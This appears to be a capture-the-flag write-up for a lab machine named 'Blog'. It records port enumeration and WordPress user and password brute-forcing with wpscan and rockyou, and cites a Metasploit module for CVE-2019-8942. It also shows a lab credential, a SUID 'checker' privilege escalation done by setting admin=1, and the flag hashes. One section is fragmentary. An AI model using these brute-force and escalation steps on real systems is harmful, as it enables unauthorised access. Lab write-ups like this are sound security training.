# Blog

**IP Address:** 10.10.103.253

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X |
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 445/tcp | open | netbios-ssn | Samba smbd 4.7.6-Ubuntu |
| 80/tcp | open | http | Apache httpd 2.4.29 |
| 137/udp | open | netbios-ns | Samba nmbd netbios-ns  |

## Exploitation
### Exploit Details (Metasploit)
* **Name** - WordPress Crop-image Shell Upload
* **CVE** - CVE-2019-8942
* **Module** - exploit/multi/http/wp_crop_rce
* **Disclosed** - 2019-02-19
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2019-8942
  * https://nvd.nist.gov/vuln/detail/CVE-2019-8943
  * https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/

1. First we need to find some credentials so first we bruteforce a list of users. 

Commands
```
wpscan --url http://blog.thm --enumerate u
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

2. We can now copy both of these usernames into users.txt and use that to bruteforce a password.

Commands
```
wpscan --url http://blog.thm -U users.txt -P /usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

3. 
Karen Wheeler
Billy Joel 
kwheel / cutiepie1
bjoel

BillySMB

/usr/sbin/checker



Commands
```
whoami
cat /media/usb/user.txt
```

![Execute Exploit](images/exploit1.png)

## Privilege Escalation
### Exploit Details (SUID (checker))
* **Name** - SUID (checker)
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

A custom file called checker has SUID permissions. We can leverage this to elevate to root however before we can do this we have to add the admin environment variable as it is used to confirm that it is being run from a root account. 

Commands
```bash
export admin=1
checker
whoami
cat /root/root.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
user.txt
c8421899aae571f7af486492b71a8ab7
root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```